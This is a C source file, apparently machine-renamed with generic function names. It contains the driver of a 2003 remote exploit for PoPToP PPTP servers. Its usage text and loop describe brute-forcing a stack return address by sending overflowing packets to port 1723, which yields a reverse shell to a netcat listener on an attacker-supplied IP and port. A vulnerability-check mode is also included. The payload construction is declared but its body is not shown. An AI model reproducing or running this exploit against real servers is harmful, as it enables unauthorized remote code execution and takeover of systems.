#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {int /*<<< orphan*/  ctrl_type; int /*<<< orphan*/  length; } ;
struct pptp_reply {TYPE_1__ header; } ;
typedef  int DWORD ;

/* Variables and functions */
 int BOTTOMOFSTACK ; 
 scalar_t__ STEP ; 
 int TOPOFSTACK ; 
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC2 (char*) ; 
 int FUNC3 (int /*<<< orphan*/ ) ; 
 int FUNC4 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC5 (char*,...) ; 
 int FUNC6 (int /*<<< orphan*/ ,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC7 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC8 (int /*<<< orphan*/ ,int,char*,int) ; 
 int /*<<< orphan*/  FUNC9 (int) ; 
 int /*<<< orphan*/  st ; 

int FUNC10(int argc, char** argv)
{
        FUNC5("\n");
        FUNC5("                   D  H     H                            \n");
        FUNC5("                   D  H     H     T\n");
        FUNC5("                   D  H  H  H     T     EE    AA   M   M \n");
        FUNC5("               DDD D  HHHHHHH     T    E  E  A  A  MM MM \n");
        FUNC5("              D   DD  H  H  H    TTTT  E  E  A  A  MM MM \n");
        FUNC5("             D     D  H     H     T    EEE   AAAA  M M M \n");
        FUNC5("              D    D  H     H     T    E     A  A  M   M \n");
        FUNC5("               DDDD   H     H      TTT  EEE  A  A  M   M   ");
        FUNC5(" ... presents ... \n\n");
  	FUNC5("Exploit for PoPToP PPTP server older than \n1.1.4-b3 and 1.1.3-20030409 under Linux.\n");
        FUNC5("by .einstein., April 2003.\n");
        FUNC5("\n");
  if (argc < 2)
  {
        FUNC5("usage: \n");
        FUNC5("  %s <pptp_server> [<your_ip>] [<your_port>] [<timeout>]\n\n",argv[0]);
        FUNC5("    <pptp_server> is the ip address or hostname of the PoPToP server\n");
        FUNC5("      you want to attack.  Port 1723 is used for connection\n");
        FUNC5("    <your_ip> and <your_port> - specify an ip address to which\n");
        FUNC5("      a connection is possible to port <your_port> and set up a\n");
        FUNC5("      netcat listener. You'll get a reverse shell.\n");
        FUNC5("    <timeout> is a delay between stack bruteforce attemts, in milliseconds\n");
        FUNC5("   If you only pass a single parameter, the program will check\n");
        FUNC5("   whether remote server is vulnerable or not. Otherwise it will\n");
        FUNC5("   perform a ret bruteforce.\n");
        FUNC5("usage examples:\n");
        FUNC5("  %s 192.168.1.2 192.168.1.1 5555\n",argv[0]);
        FUNC5("    attack 192.168.1.2 and get a reverse shell on port 5555\n");
        FUNC5("  %s 127.0.0.1 127.0.0.1 6666 100\n",argv[0]);
        FUNC5("    attack a locally running pptpd with a timeout of 100 ms\n");
        FUNC5("    and get a shell on port 6666.\n");
        FUNC5("  %s 192.168.1.56\n",argv[0]);
        FUNC5("    check if the PoPToP server on 192.168.1.56 is vulnerable.\n");
	return 0;
  }


  int timeout = 500;
  if (argc >= 5) timeout = FUNC0(argv[4]);

        DWORD ret;
        if (argc == 2)
        {
                if (!FUNC2(argv[1])) return 1;

                FUNC5("\nChecking if the server is vulnerable..\n");
                FUNC5("(if it is you have to wait 65 seconds)..\n");
                FUNC7(st);

                ret = 0x01010101;
                int bytes;
                struct pptp_reply reply;
                        
                //header length
                bytes = FUNC6(st,(char*)&reply,2,0);
                bytes = FUNC4(reply.header.length);
                bytes = FUNC6(st,(char*)&reply+2,bytes-2,0);
                int j = FUNC3(reply.header.ctrl_type);
                FUNC8(st,ret,"0.0.0.0",0);
                        
                //header length
                bytes = FUNC6(st,(char*)&reply,2,0);
                FUNC5("PoPToP server is ");
                if (bytes != -1) FUNC5("vulnerable!\n");
                else FUNC5("not vulnerable\n");
                FUNC1(st);

                return 1;
        }

        FUNC5("[!] Attempting bruteforce against %s\n",argv[1]);
        FUNC5("interrupt when you get a shell to %s on port %d...\n\n",argv[2],FUNC0(argv[3]));
        
        int checked = 0;
        
        for (ret = TOPOFSTACK; ret >=BOTTOMOFSTACK; ret -= STEP)
        {
          	FUNC5("[*] ");
                if (!FUNC2(argv[1])) return 1;
        	FUNC5("[ret=0x%x]..",ret);
        	FUNC5("sending payload..");
        
                // initial packet
                FUNC7(st);

                //a real overflowing ping packet
          	FUNC8(st,ret,argv[2],FUNC0(argv[3]));
                FUNC1(st);

                FUNC9(timeout);
                FUNC5("done\n");
        }
        
        return 0;
}